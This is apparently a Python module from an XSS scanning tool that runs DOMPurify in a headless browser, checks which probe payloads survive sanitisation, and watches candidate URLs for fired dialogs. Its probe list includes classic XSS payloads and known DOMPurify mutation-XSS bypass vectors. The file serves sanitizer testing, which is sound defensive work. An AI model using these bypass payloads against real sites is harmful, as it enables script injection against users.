"""
dompurify-scan node — sanitizer-aware XSS analysis
==================================================
Runs the locally installed DOMPurify (``~/.xscan/tools/DOMPurify``) inside a real
headless browser and answers two questions the other engines cannot:

  1. Differential sanitization — which of our candidate payloads *survive*
     ``DOMPurify.sanitize()``? Anything that survives is a mutation-XSS /
     sanitizer-bypass candidate and is worth manual review.
  2. Live execution — do candidate URLs execute injected markup in a browser
     where ``alert``/``confirm``/``prompt`` are hooked, and does the target page
     itself ship DOMPurify (and at which version)?

The browser is the system Chrome/Edge driven through Playwright — no browser
download and no npm install is required at scan time. The DOMPurify bundle is
read from the local clone, so the differential probe never touches the network.

CRITICAL FAILURE SEMANTICS (spec section 20):
  Sanitizer intact  != no vulnerability
  EXECUTION_FAILED  != safe
  Browser missing   != safe

Inputs:  target_url, xss_candidates | candidates | fused_candidates,
         urls_with_params, js_files
Outputs: dompurify_observations (list[dict]) — serialised ToolObservation
         dompurify_usage        (dict)        — whether/where the target uses it
         tool_observations      (list[dict]) — existing observations + ours
         tools_used             (list[str])  — existing tools + "dompurify"
"""
from __future__ import annotations

import json
import re
import shutil
import time
from pathlib import Path
from typing import Any

import httpx

from xscan.config.defaults import XSCAN_HOME
from xscan.core.dag.node_registry import registry
from xscan.nodes.base import ExecutionContext, NodeBase
from xscan.nodes.emitter import NodeEmitter
from xscan.schemas.xss import ToolObservation, ToolStatus

_TOOLS_DIR = XSCAN_HOME / "tools"
_PURIFY_BUILD_NAMES = ("dist/purify.js", "dist/purify.min.js", "dist/purify.cjs.js")

_MAX_TEST_URLS = 6
_MAX_JS_FETCH = 3
_MAX_PAYLOADS = 20
_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "Chrome/125.0.0.0 Safari/537.36"
)

# Curated probe set — classic payloads plus historical DOMPurify mutation-XSS
# vectors. A payload that survives sanitization is a bypass candidate.
_PROBE_PAYLOADS: list[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<math><mtext><table><mglyph><style><!--</style><img title="-->'
    '<img src=1 onerror=alert(1)>">',
    "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
    '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
    "<template><script>alert(1)</script></template>",
]

# Elements that can execute or embed script. Bare <form>/<style>/<link> are
# deliberately excluded: DOMPurify allows them by default and they are not
# script execution, so flagging them would be a false positive.
_ACTIVE_TAGS = "script,iframe,object,embed"

_DOMPURIFY_HINT = re.compile(r"dompurify|purify\.min\.js|purify\.js", re.IGNORECASE)
_VERSION_RE = re.compile(r"""version\s*[:=]\s*["'](\d+\.\d+\.\d+)["']""")

# System browsers Playwright can drive without `playwright install`.
_SYSTEM_BROWSER_PATHS = (
    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
    "/usr/bin/google-chrome",
    "/usr/bin/chromium",
    "/usr/bin/chromium-browser",
    "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
)

# Injected before every page script: dialogs are recorded instead of blocking,
# so markup execution is observable but harmless.
_HOOK_SCRIPT = """
(() => {
  window.__xscan_dialogs = [];
  const record = (name, args) => {
    try {
      window.__xscan_dialogs.push({ type: name, args: args.map(a => String(a).slice(0, 200)) });
    } catch (e) {}
  };
  ['alert', 'confirm', 'prompt', 'print'].forEach((name) => {
    const original = window[name];
    window[name] = function () {
      record(name, Array.prototype.slice.call(arguments));
      return typeof original === 'function' ? original.apply(this, arguments) : undefined;
    };
  });
})();
"""

# Differential probe: sanitize every payload in a real DOM and report active
# content found in the RESULT. Analysis happens on the parsed DOM, not on the
# raw string, so inert text such as "javascript:alert(1)" is not mistaken for
# a surviving sink.
_DIFF_SCRIPT = r"""
(payloads) => {
  const ACTIVE_TAGS = '__ACTIVE_TAGS__'.split(',');
  const URL_ATTRS = ['href', 'src', 'xlink:href', 'action', 'formaction', 'data'];

  const describe = (root) => {
    const found = [];
    root.querySelectorAll('*').forEach((el) => {
      const tag = el.tagName.toLowerCase();
      if (ACTIVE_TAGS.indexOf(tag) !== -1) found.push(tag);
      Array.from(el.attributes).forEach((attr) => {
        const name = attr.name.toLowerCase();
        if (name.indexOf('on') === 0) { found.push(tag + '@' + name); return; }
        if (URL_ATTRS.indexOf(name) !== -1 && /^\s*javascript:/i.test(attr.value)) {
          found.push(tag + '@' + name + ':javascript');
        }
        if (name === 'srcdoc') found.push(tag + '@srcdoc');
      });
    });
    return Array.from(new Set(found));
  };

  const out = [];
  for (const payload of payloads) {
    let sanitized = null;
    let error = '';
    let active = [];
    try {
      sanitized = DOMPurify.sanitize(payload);
      const box = document.createElement('div');
      box.innerHTML = sanitized;
      active = describe(box);
    } catch (e) {
      error = String(e && e.message ? e.message : e).slice(0, 200);
    }
    out.push({ payload: payload, sanitized: sanitized, active: active, error: error });
  }
  return out;
}
""".replace("__ACTIVE_TAGS__", _ACTIVE_TAGS)


def _find_purify_clone() -> Path | None:
    """
    Locate the DOMPurify clone inside ~/.xscan/tools.

    The directory is matched case-insensitively: installing by name creates
    ``dompurify/`` while installing from the GitHub URL creates ``DOMPurify/``,
    and that only collapses on case-insensitive filesystems.
    """
    if not _TOOLS_DIR.exists():
        return None
    for entry in _TOOLS_DIR.iterdir():
        if entry.is_dir() and entry.name.lower().replace("-", "") == "dompurify":
            return entry
    return None


def _find_purify_build() -> Path | None:
    """Locate the browser-build DOMPurify bundle inside the local clone."""
    clone = _find_purify_clone()
    if clone is None:
        return None
    for rel in _PURIFY_BUILD_NAMES:
        candidate = clone / rel
        if candidate.exists():
            return candidate
    return None


def _clone_version() -> str:
    """Version reported by the locally installed DOMPurify clone."""
    clone = _find_purify_clone()
    if clone is None:
        return ""
    try:
        pkg = json.loads((clone / "package.json").read_text(encoding="utf-8"))
        return str(pkg.get("version", ""))
    except Exception:
        return ""


def _find_system_browser() -> str | None:
    """Path to an installed Chrome/Edge/Chromium, or None."""
    for name in ("chrome", "google-chrome", "msedge", "chromium", "chromium-browser"):
        found = shutil.which(name)
        if found:
            return found
    for path in _SYSTEM_BROWSER_PATHS:
        if Path(path).exists():
            return path
    return None


def _system_browser_present() -> bool:
    """True when a system Chrome/Edge is available for Playwright to drive."""
    return _find_system_browser() is not None


def _launch_browser(playwright: Any) -> Any:
    """
    Launch a system Chromium-based browser.

    ``playwright install`` is never required: an installed Chrome/Edge is driven
    directly by path, then by channel, and only then is the bundled Chromium
    (if downloaded) tried. Every failure is reported, not just the last.
    """
    errors: list[str] = []
    attempts: list[dict[str, Any]] = []
    executable = _find_system_browser()
    if executable:
        attempts.append({"executable_path": executable})
    attempts.extend(({"channel": "chrome"}, {"channel": "msedge"}, {}))

    for kwargs in attempts:
        try:
            return playwright.chromium.launch(headless=True, **kwargs)
        except Exception as exc:
            label = str(kwargs.get("executable_path") or kwargs.get("channel") or "bundled chromium")
            errors.append(f"{label}: {str(exc).splitlines()[0][:120]}")
    raise RuntimeError("No Chromium-based browser available (" + "; ".join(errors) + ")")


@registry.register("dompurify-scan")
class DomPurifyScanNode(NodeBase, NodeEmitter):
    node_type = "dompurify-scan"

    def execute(self, ctx: ExecutionContext) -> dict[str, Any]:
        t0 = self.emit_started(ctx)

        # Keep whatever other tools already produced — this node runs after
        # tool-xss-scan and must never drop its observations.
        existing_obs: list[dict[str, Any]] = list(ctx.get("tool_observations") or [])
        existing_tools: list[str] = list(ctx.get("tools_used") or [])

        build = _find_purify_build()
        if build is None:
            self.emit_warning(
                ctx,
                "DOMPurify not installed — run: "
                "xscan install https://github.com/cure53/DOMPurify.git",
            )
            self.emit_completed(
                ctx,
                metrics={"dompurify": "not_installed"},
                duration_ms=(time.monotonic() - t0) * 1000,
            )
            return {
                "dompurify_observations": [],
                "dompurify_usage": {"available": False, "used_by_target": False},
                "tool_observations": existing_obs,
                "tools_used": existing_tools,
            }

        payloads = self._collect_payloads(ctx)
        test_urls = self._collect_test_urls(ctx)
        usage = self._detect_target_usage(ctx, test_urls)
        usage["available"] = True
        self.emit_progress(
            ctx,
            f"DOMPurify {_clone_version()} loaded; target uses DOMPurify: "
            f"{'yes' if usage['used_by_target'] else 'no'}",
        )

        observations: list[ToolObservation] = []
        browser_error = self._run_browser_checks(ctx, build, payloads, test_urls, observations)
        if browser_error:
            self.emit_warning(ctx, f"DOMPurify browser checks skipped: {browser_error}")
            observations.append(ToolObservation(
                tool="dompurify",
                version=_clone_version(),
                target_url=ctx.get("target_url", ""),
                status=ToolStatus.EXECUTION_FAILED,
                observation=f"browser unavailable: {browser_error}",
            ))

        dumped = [o.model_dump(mode="json") for o in observations]
        self.emit_completed(ctx, metrics={
            "dompurify_observations": len(observations),
            "bypass_candidates":      sum(1 for o in observations if o.has_candidates),
            "target_uses_dompurify":  bool(usage["used_by_target"]),
        }, duration_ms=(time.monotonic() - t0) * 1000)

        return {
            "dompurify_observations": dumped,
            "dompurify_usage":        usage,
            "tool_observations":      existing_obs + dumped,
            "tools_used":             existing_tools + ["dompurify"],
        }

    # ------------------------------------------------------------------
    # Input collection
    # ------------------------------------------------------------------

    @staticmethod
    def _candidates(ctx: ExecutionContext) -> list[dict[str, Any]]:
        return list(
            ctx.get("xss_candidates")
            or ctx.get("candidates")
            or ctx.get("fused_candidates")
            or []
        )

    @classmethod
    def _collect_test_urls(cls, ctx: ExecutionContext) -> list[str]:
        urls: list[str] = []
        for cand in cls._candidates(ctx):
            url = cand.get("best_test_url") or cand.get("request_url") or cand.get("url", "")
            if url and url not in urls:
                urls.append(url)
        for url in (ctx.get("urls_with_params") or []):
            if url not in urls:
                urls.append(url)
        return urls[:_MAX_TEST_URLS]

    @classmethod
    def _collect_payloads(cls, ctx: ExecutionContext) -> list[str]:
        limit = int(ctx.config.get("max_payloads", _MAX_PAYLOADS))
        payloads: list[str] = []
        for cand in cls._candidates(ctx):
            for key in ("best_payload", "payload"):
                value = cand.get(key) or ""
                if value and value not in payloads:
                    payloads.append(value)
            for obs in (cand.get("tool_observations") or []):
                for payload in (obs.get("payloads") or []):
                    if payload and payload not in payloads:
                        payloads.append(payload)
        for taint in (ctx.get("taint_paths") or []):
            for payload in (taint.get("payloads") or []):
                if payload and payload not in payloads:
                    payloads.append(payload)
        for probe in _PROBE_PAYLOADS:
            if probe not in payloads:
                payloads.append(probe)
        return payloads[:limit]

    def _detect_target_usage(
        self,
        ctx: ExecutionContext,
        test_urls: list[str],
    ) -> dict[str, Any]:
        """
        Does the target ship DOMPurify?

        Uses the js_files inventory when present (xss-deep) and falls back to
        fetching candidate pages directly (xss-balanced).
        """
        usage: dict[str, Any] = {
            "available": True,
            "used_by_target": False,
            "files": [],
            "version": "",
        }

        sources: list[tuple[str, str]] = []
        for js in (ctx.get("js_files") or []):
            content = js.get("content", "")
            if content:
                sources.append((str(js.get("url", "inline")), content))
        if not sources:
            sources = self._fetch_pages(ctx, test_urls)

        for label, blob in sources:
            if _DOMPURIFY_HINT.search(blob):
                usage["used_by_target"] = True
                if label not in usage["files"]:
                    usage["files"].append(label)
                if not usage["version"]:
                    match = _VERSION_RE.search(blob)
                    if match:
                        usage["version"] = match.group(1)
        return usage

    @staticmethod
    def _fetch_pages(ctx: ExecutionContext, urls: list[str]) -> list[tuple[str, str]]:
        sources: list[tuple[str, str]] = []
        try:
            client = httpx.Client(
                follow_redirects=True, timeout=10, verify=False,
                headers={"User-Agent": _UA},
            )
        except Exception:
            return sources
        try:
            for url in urls[:_MAX_JS_FETCH]:
                try:
                    ctx.scope.assert_allowed(url, operation="http_request")
                    response = client.get(url)
                except Exception:
                    continue
                if response.status_code == 200:
                    sources.append((url, response.text))
        finally:
            client.close()
        return sources

    # ------------------------------------------------------------------
    # Browser checks
    # ------------------------------------------------------------------

    def _run_browser_checks(
        self,
        ctx: ExecutionContext,
        build: Path,
        payloads: list[str],
        test_urls: list[str],
        observations: list[ToolObservation],
    ) -> str:
        """Run the differential + live probes. Returns an error string on failure."""
        try:
            from playwright.sync_api import sync_playwright
        except Exception as exc:
            return f"playwright unavailable: {exc}"

        try:
            with sync_playwright() as playwright:
                browser = _launch_browser(playwright)
                try:
                    observations.append(
                        self._differential_probe(ctx, browser, build, payloads)
                    )
                    for url in test_urls:
                        observations.append(self._live_probe(ctx, browser, url))
                finally:
                    browser.close()
        except Exception as exc:
            return str(exc)[:200]
        return ""

    def _differential_probe(
        self,
        ctx: ExecutionContext,
        browser: Any,
        build: Path,
        payloads: list[str],
    ) -> ToolObservation:
        """Which payloads survive DOMPurify.sanitize()?"""
        obs = ToolObservation(
            tool="dompurify",
            version=_clone_version(),
            target_url="local://dompurify-differential",
            endpoint="DOMPurify.sanitize",
            status=ToolStatus.NO_CANDIDATES,
            observation="differential probe did not run",
        )

        try:
            page = browser.new_page()
            try:
                page.add_init_script(
                    script=build.read_text(encoding="utf-8", errors="replace")
                )
                page.goto("about:blank")
                version = page.evaluate(
                    "() => (typeof DOMPurify !== 'undefined' && DOMPurify.version) || ''"
                )
                if version:
                    obs.version = str(version)
                results = page.evaluate(_DIFF_SCRIPT, payloads)
            finally:
                page.close()
        except Exception as exc:
            obs.status = ToolStatus.EXECUTION_FAILED
            obs.observation = f"differential probe failed: {exc}"
            return obs

        survivors, details = self._classify_results(list(results or []))
        obs.payloads = survivors[:20]
        obs.raw_output = json.dumps(details, ensure_ascii=False)[:500]
        if survivors:
            obs.status = ToolStatus.CANDIDATE
            obs.observation = (
                f"DOMPurify {obs.version}: {len(survivors)}/{len(payloads)} payload(s) "
                f"kept active content after sanitization — sanitizer-bypass review needed"
            )
        else:
            obs.status = ToolStatus.NO_CANDIDATES
            obs.observation = (
                f"DOMPurify {obs.version}: all {len(payloads)} probe payloads "
                f"neutralised (sanitizer behaving as configured)"
            )
        return obs

    @staticmethod
    def _classify_results(
        results: list[dict[str, Any]],
    ) -> tuple[list[str], list[dict[str, Any]]]:
        """
        Split browser probe output into surviving payloads and evidence.

        A payload only survives when the sanitized DOM still contains active
        content. Inert text (e.g. a bare ``javascript:alert(1)``) is not a sink.
        """
        survivors: list[str] = []
        details: list[dict[str, Any]] = []
        for item in results:
            payload = str(item.get("payload", ""))
            error = str(item.get("error", ""))
            if error:
                details.append({"payload": payload, "error": error})
                continue
            active = [str(a) for a in (item.get("active") or [])]
            sanitized = item.get("sanitized")
            clean = "" if sanitized is None else str(sanitized)
            if active:
                survivors.append(payload)
            details.append({
                "payload": payload,
                "survived": bool(active),
                "active": active,
                "sanitized": clean[:200],
            })
        return survivors, details

    def _live_probe(
        self,
        ctx: ExecutionContext,
        browser: Any,
        url: str,
    ) -> ToolObservation:
        """Load the URL in a hooked browser and watch for executed markup."""
        obs = ToolObservation(
            tool="dompurify", version=_clone_version(), target_url=url, endpoint=url,
        )
        try:
            ctx.scope.assert_allowed(url, operation="http_request")
        except Exception as exc:
            obs.status = ToolStatus.EXECUTION_FAILED
            obs.observation = f"scope_blocked: {exc}"
            return obs

        from playwright.sync_api import TimeoutError as PlaywrightTimeoutError

        try:
            page = browser.new_page()
            try:
                page.add_init_script(script=_HOOK_SCRIPT)
                page.goto(url, wait_until="load", timeout=15_000)
                page.wait_for_timeout(600)
                dialogs = page.evaluate("() => window.__xscan_dialogs || []") or []
                on_page = page.evaluate(
                    "() => (typeof DOMPurify !== 'undefined' && DOMPurify.version) || ''"
                )
            finally:
                page.close()
        except PlaywrightTimeoutError:
            obs.status = ToolStatus.TIMEOUT
            obs.observation = "page load timed out after 15s"
            return obs
        except Exception as exc:
            obs.status = ToolStatus.EXECUTION_FAILED
            obs.observation = f"browser navigation failed: {str(exc)[:200]}"
            return obs

        if on_page:
            obs.version = str(on_page)
        if dialogs:
            obs.status = ToolStatus.CANDIDATE
            obs.payloads = [
                str(d.get("args", [""])[0])[:120]
                for d in dialogs
                if d.get("args")
            ][:10]
            obs.observation = (
                f"JS dialog fired in browser ({len(dialogs)}) — injected markup executed"
            )
            obs.raw_output = json.dumps(dialogs, ensure_ascii=False)[:500]
        else:
            obs.status = ToolStatus.NO_CANDIDATES
            obs.observation = (
                "page loaded; no dialog fired; page DOMPurify: "
                f"v{on_page}" if on_page else
                "page loaded; no dialog fired; page does not ship DOMPurify"
            )
        return obs
